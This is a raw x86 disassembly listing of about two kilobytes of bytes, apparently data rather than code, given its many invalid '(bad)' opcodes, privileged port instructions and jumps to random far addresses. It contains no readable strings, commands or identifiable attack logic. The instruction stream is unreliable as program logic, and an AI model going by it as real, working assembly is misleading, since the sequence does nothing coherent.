  41dd66:	in     eax,dx
  41dd67:	rep lods eax,DWORD PTR ds:[esi]
  41dd69:	mov    cl,0xac
  41dd6b:	mov    dl,0xc8
  41dd6e:	hlt    
  41dd6f:	retf   
  41dd70:	stc    
  41dd71:	mov    cl,0xda
  41dd73:	into   
  41dd74:	in     eax,dx
  41dd75:	hlt    
  41dd76:	aam    0xf7
  41dd78:	rol    ecx,0xb9
  41dd7b:	mov    eax,0xbf7f3f1
  41dd80:	shl    ecx,1
  41dd82:	(bad)  
  41dd83:	fmul   st,st(7)
  41dd85:	vpsraw ymm1,ymm4,xmm6
  41dd89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd8a:	enter  0xcff1,0xc1
  41dd8e:	repz (bad) 
  41dd90:	loopne 0x41dd66
  41dd92:	stc    
  41dd93:	fcomip st,st(5)
  41dd95:	fcmove st,st(0)
  41dd97:	aam    0xd0
  41dd99:	(bad)  
  41dd9a:	sti    
  41dd9b:	mov    ah,0xd9
  41dd9d:	shl    eax,0xd0
  41dda0:	neg    eax
  41dda2:	add    BYTE PTR [eax],al
  41dda4:	in     eax,0xff
  41dda6:	ror    DWORD PTR [eax],cl
  41dda8:	leave  
  41dda9:	loope  0x41dd5c
  41ddab:	shl    esi,cl
  41ddad:	mov    ch,0xbb
  41ddaf:	repz mov edx,0xf0b8c5c5
  41ddb5:	retf   0xd2f5
  41ddb8:	int    0xc3
  41ddba:	rol    DWORD PTR [ecx],0xdb
  41ddbd:	test   bh,0xdf
  41ddc0:	jecxz  0x41dda1
  41ddc2:	std    
  41ddc3:	add    al,0xeb
  41ddc5:	loop   0x41ddd9
  41ddc7:	out    dx,al
  41ddc8:	repz mov al,0xc0
  41ddcb:	in     al,dx
  41ddcc:	int    0xc2
  41ddce:	shr    ch,0xeb
  41ddd1:	cmc    
  41ddd2:	cmc    
  41ddd3:	into   
  41ddd4:	retf   
  41ddd5:	aad    0xfc
  41ddd7:	mov    ebx,0xf3f4bdfa
  41dddc:	add    eax,0xfcf9dbfa
  41dde1:	clc    
  41dde2:	jecxz  0x41ddc1
  41dde4:	fimul  DWORD PTR [eax+eiz*8]
  41dde7:	std    
  41dde8:	stos   BYTE PTR es:[edi],al
  41dde9:	repnz fcomip st,st(3)
  41ddec:	out    0xf1,eax
  41ddee:	hlt    
  41ddef:	enter  0xb2e1,0xf0
  41ddf3:	cmc    
  41ddf4:	(bad)  
  41ddf6:	cli    
  41ddf7:	loop   0x41ddd8
  41ddf9:	mov    ecx,0xf6dcc006
  41ddfe:	jmp    0x41ddc5
  41de00:	in     eax,0xc6
  41de02:	loopne 0x41dde1
  41de04:	add    bh,cl
  41de06:	fcomi  st,st(1)
  41de08:	fsubrp st(5),st
  41de0a:	mov    bh,0xea
  41de0c:	rcl    al,cl
  41de0e:	(bad)  
  41de0f:	stc    
  41de10:	shl    ebx,1
  41de12:	mov    ebx,0xdfe9d5d4
  41de17:	hlt    
  41de18:	mov    esi,0xbbf0f6be
  41de1d:	mov    esi,0xfccbd70b
  41de22:	pop    es
  41de23:	loop   0x41ddf3
  41de25:	fscale 
  41de27:	fmul   st,st(6)
  41de29:	in     eax,0xe2
  41de2b:	xlat   BYTE PTR ds:[ebx]
  41de2c:	mov    dh,0xb3
  41de2e:	retf   0xb0c6
  41de31:	stc    
  41de32:	(bad)  
  41de33:	out    dx,eax
  41de34:	cmc    
  41de35:	(bad)  
  41de36:	mov    ebx,0xc2d7cffb
  41de3b:	hlt    
  41de3c:	add    eax,0xe5f1d6d6
  41de41:	(bad)  
  41de42:	out    dx,al
  41de43:	retf   0xeee2
  41de46:	dec    bl
  41de48:	(bad)  
  41de49:	mov    cl,0xf2
  41de4b:	call   0xa90fadfd
  41de50:	in     eax,0xf6
  41de52:	fprem  
  41de54:	(bad)  
  41de55:	aam    0xda
  41de57:	jmp    0xc33cb545
  41de5c:	push   edi
  41de5e:	shl    dh,1
  41de60:	or     edi,ebp
  41de62:	jmp    0xeceb:0xff0fc907
  41de69:	xlat   BYTE PTR ds:[ebx]
  41de6a:	jecxz  0x41de29
  41de6c:	rol    ah,0xc6
  41de6f:	in     eax,dx
  41de70:	mov    edx,0xf3f6d3e0
  41de75:	mov    edi,0xdfd9d0c3
  41de7a:	div    bh
  41de7c:	fiadd  DWORD PTR [edx]
  41de7e:	shr    dl,cl
  41de80:	or     ah,bl
  41de82:	clc    
  41de83:	loope  0x41de92
  41de85:	loopne 0x41de91
  41de87:	in     eax,0xca
  41de89:	mov    edi,0xe8e1dcbd
  41de8e:	aam    0xe9
  41de90:	int3   
  41de91:	stc    
  41de92:	fcomip st,st(2)
  41de94:	mov    edx,0xccdee3b2
  41de99:	std    
  41de9a:	mov    edi,0x2c204fe
  41de9f:	aam    0xd6
  41dea1:	fxch   st(7)
  41dea3:	loopne 0x41de84
  41dea5:	push   es
  41dea6:	rol    DWORD PTR [edx],cl
  41dea8:	loop   0x41de96
  41deaa:	iret   
  41deab:	jmp    0xcbc5:0xc5e7f1e1
  41deb2:	in     al,dx
  41deb3:	enter  0xeebb,0xf1
  41deb7:	int    0xf9
  41deb9:	mov    esi,0xd001dbe2
  41debe:	lock in eax,0xc7
  41dec1:	or     bl,cl
  41dec3:	cld    
  41dec4:	add    bh,bl
  41dec6:	(bad)  
  41dec8:	repnz rcr ebp,1
  41decb:	fdiv   QWORD PTR [eax-0x26043452]
  41ded1:	mov    eax,0xb4cdf6e5
  41ded6:	out    dx,al
  41ded7:	mov    al,0xdc
  41ded9:	enter  0xf2cc,0xda
  41dedd:	mov    ebp,0xbef0fcb9
  41dee2:	pop    es
  41dee3:	fdivr  st,st(3)
  41dee5:	add    bh,cl
  41dee7:	icebp  
  41dee8:	ret    
  41dee9:	xlat   BYTE PTR ds:[ebx]
  41deea:	jmp    0xbbc4:0xc0b4f0be
  41def1:	mov    ah,0xeb
  41def3:	mov    ch,0xe4
  41def5:	cld    
  41def6:	retf   
  41def7:	(bad)  
  41def8:	mov    ebp,0xda07fcbf
  41defd:	fadd   DWORD PTR ds:0x5be01d0
  41df03:	iret   
  41df04:	loopne 0x41deef
  41df06:	std    
  41df07:	in     eax,dx
  41df08:	int    0xb3
  41df0a:	in     eax,0xae
  41df0c:	in     eax,dx
  41df0d:	in     eax,0xb0
  41df0f:	loopne 0x41def1
  41df11:	enter  0xdde5,0xbd
  41df15:	std    
  41df16:	mov    ecx,0xd0d6f0f1
  41df1b:	add    esp,edi
  41df1d:	out    0xe5,eax
  41df1f:	in     al,0xc0
  41df21:	mul    cl
  41df23:	fdivr  st,st(5)
  41df25:	in     al,dx
  41df26:	retf   0xcaff
  41df29:	jmp    0xd513d1ee
  41df2e:	lods   eax,DWORD PTR ds:[esi]
  41df2f:	(bad)  
  41df30:	aad    0xbb
  41df32:	cmc    
  41df33:	mov    bh,0xc5
  41df35:	jmp    0xd740e2ee
  41df3a:	fsubp  st(6),st
  41df3c:	(bad)  
  41df3d:	inc    BYTE PTR [ebx]
  41df3f:	sar    ebx,1
  41df41:	(bad)  
  41df43:	(bad)  
  41df45:	mov    ah,0xa
  41df48:	ror    edx,cl
  41df4a:	int    0xa4
  41df4c:	aad    0xf2
  41df4e:	int    0xe1
  41df50:	int3   
  41df51:	scas   al,BYTE PTR es:[edi]
  41df52:	stc    
  41df53:	mov    edi,0xfcf2dfbd
  41df58:	clc    
  41df59:	fnstsw ax
  41df5b:	mov    esi,0xc302fafb
  41df60:	(bad)
  41df63:	in     eax,dx
  41df64:	(bad)  
  41df66:	adc    ecx,eax
  41df68:	out    0xcf,eax
  41df6a:	scas   eax,DWORD PTR es:[edi]
  41df6b:	out    dx,al
  41df6c:	(bad)  
  41df6d:	into   
  41df6e:	enter  0xe9d6,0xba
  41df72:	in     al,dx
  41df73:	icebp  
  41df74:	mov    bh,0xf1
  41df76:	mov    edi,0xf1e7b9d2
  41df7b:	loope  0x41df62
  41df7d:	sar    BYTE PTR [ecx-0x1bfa1d2b],cl
  41df83:	cmc    
  41df84:	or     ebp,esp
  41df86:	add    DWORD PTR ds:0xe4bfb3c2,ecx
  41df8c:	int3   
  41df8d:	jecxz  0x41df59
  41df8f:	shl    esi,cl
  41df91:	(bad)  
  41df92:	(bad)  
  41df93:	sti    
  41df94:	icebp  
  41df95:	jecxz  0x41df8c
  41df97:	cli    
  41df98:	fsubrp st(3),st
  41df9a:	mov    esi,0xbceb00d5
  41df9f:	in     al,0xc3
  41dfa1:	lds    ecx,FWORD PTR [edi]
  41dfa3:	aam    0xcf
  41dfa5:	out    0x12,eax
  41dfa7:	std    
  41dfa8:	rcl    bh,1
  41dfaa:	mov    dl,0xac
  41dfac:	(bad)  
  41dfad:	repz fcmovnb st,st(4)
  41dfb0:	xlat   BYTE PTR ds:[ebx]
  41dfb1:	mov    eax,0xcec8c9ed
  41dfb6:	cli    
  41dfb7:	mov    edi,0xdcf5d4bd
  41dfbc:	mov    esp,0xd1e5ead2
  41dfc1:	add    DWORD PTR ds:0xd90fc4e4,eax
  41dfc7:	vmptrst QWORD PTR [edx+eiz*8-0x49241349]
  41dfcf:	mov    edx,0xb6b4fff6
  41dfd4:	mov    esi,0xb8d1e9cb
  41dfd9:	mov    ecx,0xddd1f8c7
  41dfde:	mov    ecx,0xcbc8bff4
  41dfe3:	paddusb mm1,QWORD PTR [eax]
  41dfe6:	add    al,0xff
  41dfe8:	(bad)  
  41dfe9:	not    edi
  41dfeb:	(bad)  
  41dfec:	call   0xc90dcab3
  41dff1:	hlt    
  41dff2:	aad    0xe9
  41dff4:	div    DWORD PTR [ebp-0x1e2b3507]
  41dffa:	int    0xf9
  41dffc:	rol    dl,0x4
  41dfff:	test   BYTE PTR [ecx],0xc5
  41e002:	(bad)
  41e005:	retf   
  41e006:	int    0xe6
  41e008:	rol    ch,1
  41e00a:	mov    bl,0xd2
  41e00c:	mov    dl,0xeb
  41e00e:	into   
  41e00f:	mov    ch,0xe7
  41e011:	mov    dl,0xad
  41e013:	mov    esi,0xfcbed9fd
  41e018:	add    DWORD PTR [edx-0x240c0904],edi
  41e01e:	or     bh,cl
  41e020:	cmc    
  41e021:	out    0xe6,al
  41e023:	mov    dh,0xcd
  41e026:	repz add ebp,edi
  41e029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e02a:	mov    edi,0xc5d2ebf7
  41e02f:	leave  
  41e030:	mov    ah,0xb2
  41e032:	retf   0xd5ca
  41e035:	in     al,dx
  41e036:	mul    ecx
  41e038:	enter  0xe1bf,0xc7
  41e03c:	loopne 0x41e000
  41e03e:	loop   0x41e019
  41e040:	shl    bh,0xc7
  41e043:	loope  0x41e045
  41e045:	add    edi,edi
  41e047:	loopne 0x41e030
  41e049:	test   eax,0xe4f1c5cd
  41e04f:	aam    0xbb
  41e051:	mov    ecx,0xfaf3c4d5
  41e056:	lock in eax,dx
  41e058:	idiv   bh
  41e05a:	mov    edi,0xfe02d7e7
  41e05f:	jmp    0xdc0e:0xbcfbf7ff
  41e066:	in     eax,dx
  41e067:	out    0xa9,eax
  41e069:	scas   eax,DWORD PTR es:[edi]
  41e06a:	repz jmp 0xf50ec55c
  41e070:	scas   eax,DWORD PTR es:[edi]
  41e071:	cmc    
  41e072:	out    dx,al
  41e073:	repz mov edi,0xd6b9c9fe
  41e079:	clc    
  41e07a:	rcr    esi,cl
  41e07c:	in     eax,0xbd
  41e07e:	pop    es
  41e07f:	fndisi(8087 only) 
  41e081:	paddw  mm1,mm7
  41e084:	push   es
  41e085:	retf   
  41e086:	retf   0xd0ea
  41e089:	ret    0xb7be
  41e08c:	(bad)  
  41e08d:	shr    DWORD PTR [ebp-0x4a283b29],cl
  41e093:	int    0xd5
  41e095:	(bad)
  41e099:	add    ecx,edx
  41e09b:	pop    es
  41e09c:	add    esp,esp
  41e09e:	loopne 0x41e06b
  41e0a0:	in     eax,0xda
  41e0a2:	(bad)  
  41e0a3:	(bad)  
  41e0a4:	jecxz  0x41e089
  41e0a6:	out    dx,al
  41e0a7:	in     al,0xd0
  41e0a9:	out    dx,al
  41e0aa:	jmp    0x41e078
  41e0ac:	(bad)
  41e0b0:	repz iret 
  41e0b2:	retf   0xefcc
  41e0b5:	rol    DWORD PTR [edx],cl
  41e0b7:	(bad)  
  41e0b9:	jecxz  0x41e0a2
  41e0bb:	add    eax,0xfbdbc705
  41e0c0:	aad    0xef
  41e0c2:	(bad)  
  41e0c4:	dec    al
  41e0c6:	adc    ebp,eax
  41e0c8:	fsubrp st(6),st
  41e0ca:	(bad)  
  41e0cb:	into   
  41e0cc:	aad    0xb5
  41e0ce:	rep lods al,BYTE PTR ds:[esi]
  41e0d0:	rcl    dh,1
  41e0d2:	lock (bad) 
  41e0d5:	cmc    
  41e0d6:	jmp    0x41e091
  41e0d8:	add    esp,ecx
  41e0da:	pop    es
  41e0db:	(bad)  
  41e0dd:	repz aad 0xd2
  41e0e0:	faddp  st(2),st
  41e0e2:	iret   
  41e0e3:	out    dx,eax
  41e0e4:	out    0xcd,eax
  41e0e6:	iret   
  41e0e7:	fidivr WORD PTR [ebp-0x1c430c2d]
  41e0ed:	int3   
  41e0ee:	out    0xf1,eax
  41e0f0:	sar    al,0xe6
  41e0f3:	mov    ah,0xd0
  41e0f5:	mov    esi,0xdff4baca
  41e0fa:	repz jmp eax
  41e0fd:	(bad)  
  41e0fe:	stc    
  41e0ff:	fsubrp st(4),st
  41e101:	retf   
  41e102:	or     ebx,ebx
  41e104:	jmp    0xe7c8:0xd3e90fe1
  41e10b:	leave  
  41e10c:	shl    eax,1
  41e10e:	out    dx,al
  41e10f:	out    dx,eax
  41e110:	aad    0xd8
  41e112:	(bad)  
  41e113:	fcmove st,st(1)
  41e115:	xlat   BYTE PTR ds:[ebx]
  41e116:	int    0xd8
  41e118:	hlt    
  41e119:	(bad)  
  41e11a:	inc    DWORD PTR [esi]
  41e11c:	fucomi st,st(4)
  41e11e:	fprem  
  41e120:	cmc    
  41e121:	cli    
  41e122:	hlt    
  41e123:	retf   
  41e124:	stc    
  41e125:	hlt    
  41e126:	out    0xce,eax
  41e128:	(bad)  
  41e12a:	loopne 0x41e122
  41e12c:	out    0xe6,eax
  41e12e:	shr    ebx,cl
  41e130:	clc    
  41e131:	cmc    
  41e132:	out    0xbf,eax
  41e134:	mov    ah,0xf3
  41e136:	imul   ecx
  41e138:	mov    esi,0xddd4ddd6
  41e13d:	mov    ebp,0xe8fa09c2
  41e142:	fsubrp st(5),st
  41e144:	cli    
  41e145:	loope  0x41e112
  41e147:	jmp    0xb6c1:0xd2c2c1a9
  41e14e:	lods   al,BYTE PTR ds:[esi]
  41e14f:	in     al,dx
  41e150:	jmp    0xce07d42f
  41e155:	rcl    edi,1
  41e157:	retf   0xd301
  41e15a:	int    0xe1
  41e15c:	fst    st(7)
  41e15e:	mov    esp,0x7e1d102
  41e163:	add    eax,0xceee01e0
  41e168:	in     eax,dx
  41e169:	les    edi,FWORD PTR [esi-0x2a1e2211]
  41e16f:	div    esp
  41e171:	mov    eax,0xdef7bffb
  41e176:	repz stc 
  41e178:	fyl2x  
  41e17a:	mov    ecx,0xd8fcffe5
  41e17f:	jmp    0x41e146
  41e181:	fild   WORD PTR [ebx+eax*1]
  41e184:	(bad)  
  41e186:	loopne 0x41e196
  41e188:	shl    ebx,0xd7
  41e18b:	leave  
  41e18c:	repnz lock cmc 
  41e18f:	mov    al,0xee
  41e191:	leave  
  41e192:	mov    ebx,0xd1eefacd
  41e197:	int3   
  41e198:	(bad)  
  41e19a:	(bad)  
  41e19c:	shl    ecx,1
  41e19e:	cli    
  41e19f:	retf   0xe1
  41e1a2:	in     eax,0x3
  41e1a4:	out    dx,eax
  41e1a5:	add    eax,0xe7d3e1dd
  41e1aa:	jecxz  0x41e170
  41e1ac:	out    0xef,eax
  41e1ae:	mov    ah,0xd3
  41e1b0:	iret   
  41e1b1:	shl    dh,cl
  41e1b3:	(bad)  
  41e1b5:	jecxz  0x41e19f
  41e1b7:	mov    ebx,0xb400def8
  41e1bc:	loop   0x41e184
  41e1be:	ror    BYTE PTR [edx],0xfd
  41e1c1:	call   0xca28e5b4
  41e1c6:	repnz std 
  41e1c8:	mov    edi,0xebc4b3e8
  41e1cd:	in     al,0xb2
  41e1cf:	(bad)  
  41e1d1:	icebp  
  41e1d2:	mov    bh,0xca
  41e1d4:	iret   
  41e1d5:	(bad)  
  41e1d6:	fstp   st(7)
  41e1d8:	shr    dh,cl
  41e1da:	out    dx,eax
  41e1db:	fsubrp st(2),st
  41e1dd:	cld    
  41e1de:	mov    esp,0xd6f8d9de
  41e1e3:	mov    esp,0xc0a13ea
  41e1e8:	int3   
  41e1e9:	lods   eax,DWORD PTR ds:[esi]
  41e1ea:	int3   
  41e1eb:	ret    
  41e1ec:	ffree  st(4)
  41e1ee:	cli    
  41e1ef:	(bad)  [ebx-0x4c080b19]
  41e1f5:	mov    edi,0xf5edcd03
  41e1fa:	add    eax,edi
  41e1fc:	loop   0x41e209
  41e1fe:	mov    ebp,0xc4d4cbf7
  41e203:	fcmove st,st(5)
  41e205:	repz adc ebp,ebp
  41e208:	fst    st(7)
  41e20a:	loopne 0x41e1dc
  41e20c:	call   0xee10acfd
  41e211:	mov    dh,0xf6
  41e213:	out    0xd3,al
  41e215:	rcl    esp,cl
  41e217:	sar    bh,1
  41e219:	add    bh,dl
  41e21b:	add    edx,esp
  41e21d:	add    ebx,ebp
  41e21f:	cmc    
  41e220:	(bad)  
  41e222:	push   cs
  41e223:	leave  
  41e224:	out    dx,eax
  41e225:	retf   0xcff9
  41e228:	mov    cl,0xbc
  41e22a:	in     al,dx
  41e22b:	out    0xca,eax
  41e22d:	in     al,0xa9
  41e22f:	out    0xea,al
  41e231:	mov    bh,0xde
  41e233:	mov    edx,0xcdefddef
  41e238:	mov    edi,0xe6f0b9fb
  41e23d:	add    al,0xd0
  41e23f:	retf   0xcbf8
  41e242:	jmp    0x41e253
  41e244:	jmp    0x41e242
  41e246:	fisttp WORD PTR ds:0xcbd3edeb
  41e24c:	lods   al,BYTE PTR ds:[esi]
  41e24d:	div    DWORD PTR [esi-0x2b4d3236]
  41e253:	stc    
  41e254:	cmc    
  41e255:	into   
  41e256:	mov    ecx,0x3e0dfd7
  41e25b:	(bad)  
  41e25d:	sar    dl,0xf9
  41e260:	jecxz  0x41e261
  41e262:	iret   
  41e263:	call   0xe607bb6c
  41e268:	mov    esi,0xcebee4ce
  41e26d:	aad    0xcb
  41e26f:	(bad)  
  41e270:	in     eax,0xf6
  41e272:	enter  0xbfd4,0xb9
  41e276:	call   0xda31cc6f
  41e27b:	loop   0x41e27e
  41e27d:	mov    edx,0xe4d7d7db
  41e282:	or     dl,dh
  41e284:	add    edx,ebp
  41e286:	out    0xf,al
  41e288:	jmp    0x41e251
  41e28a:	repz call 0xf72fd558
  41e290:	rol    ah,1
  41e292:	mov    ecx,0xcfdfd0ee
  41e297:	retf   0xb9ce
  41e29a:	fldlg2 
  41e29c:	ret    0xacc
  41e29f:	hlt    
  41e2a0:	jmp    0x41e2a4
  41e2a2:	out    dx,al
  41e2a3:	push   cs
  41e2a4:	jmp    0x41e28f
  41e2a6:	or     ebx,edx
  41e2a8:	test   al,0xd7
  41e2aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2ab:	(bad)  [edi-0x28491b53]
  41e2b1:	push   ebx
  41e2b3:	div    edx
  41e2b5:	call   0xbf419ebd
  41e2ba:	lock fild DWORD PTR ds:0xe0c1e1f1
  41e2c1:	add    eax,DWORD PTR [edi]
  41e2c3:	loopne 0x41e2bd
  41e2c5:	or     edi,ebp
  41e2c7:	iret   
  41e2c8:	rcr    esi,cl
  41e2ca:	repz (bad) 
  41e2cc:	jmp    0x41e2aa
  41e2ce:	lock leave 
  41e2d0:	enter  0xe9c6,0xe5
  41e2d4:	mov    bh,0xba
  41e2d6:	enter  0xd7fc,0xf7
  41e2da:	fcmovnb st,st(7)
  41e2dc:	out    0xfb,al
  41e2de:	fld    st(5)
  41e2e0:	fadd   st,st(5)
  41e2e2:	out    0xc5,al
  41e2e4:	jmp    0x41e2de
  41e2e6:	or     BYTE PTR [ecx],dl
  41e2e8:	jecxz  0x41e2c9
  41e2ea:	mov    cl,0xb3
  41e2ec:	in     eax,0xea
  41e2ee:	(bad)  
  41e2ef:	in     eax,0xf3
  41e2f1:	stc    
  41e2f2:	retf   
  41e2f3:	mov    al,0xc4
  41e2f5:	fmul   st(5),st
  41e2f7:	repz in al,dx
  41e2f9:	loopne 0x41e2d1
  41e2fb:	aad    0xdf
  41e2fd:	rol    BYTE PTR [edx],1
  41e2ff:	repnz retf 0xe9f5
  41e303:	aad    0xef
  41e305:	in     eax,0xa
  41e307:	icebp  
  41e308:	jmp    0xc437d204
  41e30d:	(bad)
  41e310:	(bad)  
  41e311:	(bad)  
  41e313:	std    
  41e314:	std    
  41e315:	mov    ebx,0xefede3f2
  41e31a:	mov    ch,0xdf
  41e31c:	shl    ecx,0x3
  41e31f:	shr    al,0xd8
  41e322:	cld    
  41e323:	(bad)  [ebp*8-0x1b4c3706]
  41e32a:	retf   
  41e32b:	int    0xea
  41e32d:	mov    cl,0xb5
  41e32f:	leave  
  41e330:	mov    dh,0xf1
  41e332:	(bad)  
  41e333:	aad    0xeb
  41e335:	mov    ah,0xe8
  41e337:	(bad)  
  41e338:	mov    ecx,0xe2fcfff4
  41e33d:	(bad)
  41e340:	aam    0xfe
  41e342:	(bad)  
  41e343:	stc    
  41e344:	add    eax,ecx
  41e346:	or     bh,al
  41e348:	out    dx,eax
  41e349:	in     al,0xcf
  41e34b:	mov    dl,0xf1
  41e34d:	stos   BYTE PTR es:[edi],al
  41e34e:	jmp    0xd832ab1d
  41e353:	mov    al,0xb3
  41e355:	leave  
  41e356:	jmp    0xf120ac18
  41e35b:	sti    
  41e35c:	in     eax,dx
  41e35d:	sar    ah,1
  41e35f:	(bad)
  41e362:	neg    esp
  41e364:	or     eax,0xe400f8e9
  41e369:	icebp  
  41e36a:	mov    edi,0xecc0e5d0
  41e36f:	icebp  
  41e370:	iret   
  41e371:	mov    edx,0xfafbdfb0
  41e376:	stc    
  41e377:	out    dx,al
  41e378:	enter  0xf000,0xd5
  41e37c:	in     eax,dx
  41e37d:	jecxz  0x41e362
  41e37f:	(bad)  
  41e380:	sti    
  41e381:	add    bh,dl
  41e383:	or     esp,ebp
  41e385:	in     al,dx
  41e386:	or     ebx,esi
  41e388:	call   0xc935a480
  41e38d:	enter  0xd9d3,0xe0
  41e391:	lock int 0xf2
  41e394:	mov    bh,0xc8
  41e396:	jmp    0xf645a671
  41e39b:	sar    edx,cl
  41e39d:	not    edx
  41e39f:	sar    edx,0xfa
  41e3a2:	push   es
  41e3a3:	test   BYTE PTR [eax],0xd4
  41e3a6:	stc    
  41e3a7:	std    
  41e3a8:	retf   0xceca
  41e3ab:	iret   
  41e3ac:	mov    al,0xe3
  41e3ae:	shl    eax,1
  41e3b0:	lock jmp 0xfde9:0xbaf8faff
  41e3b8:	ret    
  41e3b9:	sti    
  41e3ba:	mov    ecx,0xd8e4dff3
  41e3bf:	fsubr  st,st(0)
  41e3c1:	rol    dh,1
  41e3c3:	cmc    
  41e3c4:	fcmovu st,st(7)
  41e3c6:	ffree  st(0)
  41e3c8:	lods   al,BYTE PTR ds:[esi]
  41e3c9:	out    0xdf,eax
  41e3cb:	repnz aam 0xce
  41e3ce:	int    0xd0
  41e3d0:	hlt    
  41e3d1:	shl    bh,cl
  41e3d3:	mov    bh,0xc8
  41e3d5:	jmp    0x41e3d0
  41e3d7:	mov    ah,0xbd
  41e3d9:	cli    
  41e3da:	rcl    edi,0xcc
  41e3dd:	aam    0xeb
  41e3df:	(bad)  
  41e3e0:	shl    eax,1
  41e3e2:	add    esp,ecx
  41e3e4:	in     eax,dx
  41e3e5:	or     bl,bh
  41e3e7:	adc    al,cl
  41e3e9:	ret    0xceb2
  41e3ec:	retf   
  41e3ed:	cmc    
  41e3ee:	(bad)  
  41e3ef:	aad    0xf4
  41e3f1:	scas   al,BYTE PTR es:[edi]
  41e3f2:	enter  0xf5e5,0xff
  41e3f6:	neg    eax
  41e3f8:	loopne 0x41e3ef
  41e3fa:	clc    
  41e3fb:	(bad)  
  41e3fc:	in     al,0xc1
  41e3fe:	hlt    
  41e3ff:	mov    esp,0xe3dedcca
  41e404:	enter  0x13df,0xfa
  41e408:	in     al,dx
  41e409:	loop   0x41e3f7
  41e40b:	test   al,0xee
  41e40d:	out    0xe0,eax
  41e40f:	(bad)  
  41e410:	shr    ecx,cl
  41e412:	out    dx,eax
  41e413:	in     eax,dx
  41e414:	out    dx,al
  41e415:	retf   
  41e416:	std    
  41e417:	fidivr WORD PTR [ecx-0x2d31014a]
  41e41d:	fsub   st,st(4)
  41e41f:	aad    0xc6
  41e421:	fiadd  WORD PTR [ebx]
  41e423:	(bad)  
  41e425:	loope  0x41e434
  41e427:	jmp    0xc2f7:0xd3f3bdf1
  41e42e:	test   eax,0xbbe7e1d4
  41e433:	mov    ebx,0xf0bcebec
  41e438:	in     eax,dx
  41e439:	hlt    
  41e43a:	(bad)  
  41e43b:	mov    DWORD PTR [esp+ebx*8],0xad7ffdc
  41e442:	retf   0x3e4
  41e445:	adc    eax,DWORD PTR [edx]
  41e447:	std    
  41e448:	stos   BYTE PTR es:[edi],al
  41e449:	loope  0x41e41b
  41e44b:	scas   al,BYTE PTR es:[edi]
  41e44c:	jmp    0xd2cd:0xb0eab3c9
  41e453:	(bad)  
  41e454:	repnz in eax,dx
  41e456:	jmp    0xf624ce3e
  41e45b:	aam    0xda
  41e45d:	add    dh,dl
  41e45f:	(bad)  
  41e460:	leave  
  41e461:	or     dl,ah
  41e463:	fisttp WORD PTR ds:0xb1e0dd05
  41e469:	jmp    0x41e439
  41e46b:	lods   al,BYTE PTR ds:[esi]
  41e46c:	(bad)  
  41e46d:	test   bl,0xc8
  41e470:	mov    edx,0xcdbfc5e7
  41e475:	aad    0xb5
  41e477:	fld    DWORD PTR [eax]
  41e479:	aad    0xc0
  41e47b:	fild   DWORD PTR ds:0xe5f60ae4
  41e481:	add    edi,esp
  41e483:	(bad)  
  41e485:	add    ebx,esp
  41e487:	adc    esi,ecx
  41e489:	stos   BYTE PTR es:[edi],al
  41e48a:	test   al,0xee
  41e48c:	ret    
  41e48d:	sti    
  41e48e:	mov    cl,0xf1
  41e490:	ror    ch,1
  41e492:	in     al,dx
  41e493:	(bad)  
  41e494:	(bad)  
  41e495:	jmp    0xbd3cb696
  41e49a:	idiv   al
  41e49c:	mov    esi,0xebff0be2
  41e4a1:	jmp    0x41e48b
  41e4a3:	(bad)  
  41e4a4:	lds    eax,FWORD PTR [ecx]
  41e4a6:	fsub   st(6),st
  41e4a8:	int    0xbc
  41e4aa:	test   al,0xe2
  41e4ac:	lock stos BYTE PTR es:[edi],al
  41e4ae:	enter  0xb6e6,0xcc
  41e4b2:	jmp    0xf125d888
  41e4b7:	int3   
  41e4b8:	add    esp,edi
  41e4ba:	in     al,dx
  41e4bb:	add    cl,dl
  41e4bd:	ret    
  41e4be:	loope  0x41e4a2
  41e4c0:	aam    0x8
  41e4c2:	fsub   st(5),st
  41e4c4:	or     DWORD PTR [edi],ecx
  41e4c6:	or     ecx,DWORD PTR [ecx]
  41e4c8:	jecxz  0x41e494
  41e4ca:	in     eax,0xb2
  41e4cc:	mov    dl,0xb3
  41e4ce:	jmp    0xf4da:0xcad8efc7
  41e4d5:	jmp    0x41e4b3
  41e4d7:	out    dx,al
  41e4d8:	mov    ebp,0xd8d1fc00
  41e4dd:	clc    
  41e4de:	std    
  41e4df:	jecxz  0x41e4e4
  41e4e1:	(bad)  
  41e4e3:	add    bl,cl
  41e4e5:	hlt    
  41e4e6:	enter  0xdcc9,0xde
  41e4ea:	out    dx,al
  41e4eb:	out    0xe8,al
  41e4ed:	hlt    
  41e4ee:	in     al,dx
  41e4ef:	lock (bad) 
  41e4f2:	(bad)  
  41e4f3:	(bad)  
  41e4f4:	repnz (bad) 
  41e4f7:	out    dx,eax
  41e4f8:	mov    ebp,0xd2f2f0f7
  41e4fd:	rol    esp,1
  41e4ff:	(bad)
  41e503:	mov    esp,0xf3c80ce6
  41e508:	fidiv  WORD PTR [edx-0x4a081a51]
  41e50e:	mov    ebx,0xcce7f6ef
  41e513:	mov    ah,0xf5
  41e515:	mov    ch,0xcd
  41e517:	mov    esp,0xf4ef03c9
  41e51c:	add    al,0x4
  41e51e:	retf   
  41e51f:	stc    
  41e520:	in     al,0xd9
  41e522:	fnstsw WORD PTR [ebp+edx*8-0x43ee1836]
  41e529:	out    dx,al
  41e52a:	retf   
  41e52b:	jmp    0x41e523
  41e52d:	lods   eax,DWORD PTR ds:[esi]
  41e52e:	out    0xd1,eax
  41e530:	jmp    0x41e528
  41e532:	(bad)  
  41e533:	fcomp  st(2)
  41e535:	out    dx,eax
  41e536:	jecxz  0x41e50d
  41e538:	mov    edx,0xdebed3d6
  41e53d:	repz ret 0x7f1
  41e541:	fdivp  st(7),st
  41e543:	jecxz  0x41e54c
  41e545:	add    bl,bl
  41e547:	int3   
  41e548:	out    0xca,eax
  41e54a:	shr    ch,0xee
  41e54d:	mov    esp,0xffc5d4d2
  41e552:	sar    al,1
  41e554:	mov    ecx,0xf5f3f3db
  41e559:	std    
  41e55a:	cli    
  41e55b:	ret    0xe7f7
  41e55e:	fcmovbe st,st(4)
  41e560:	shl    dl,1
  41e562:	fild   DWORD PTR [esi]
  41e564:	out    0xea,al
  41e566:	dec    ah
  41e568:	out    dx,eax
  41e569:	icebp  
  41e56a:	mov    esi,0xb4c9f3c7
  41e56f:	retf   
  41e570:	test   esp,0xeacddad8
  41e576:	fnstsw WORD PTR [ecx-0x1d3e0afe]
  41e57c:	hlt    
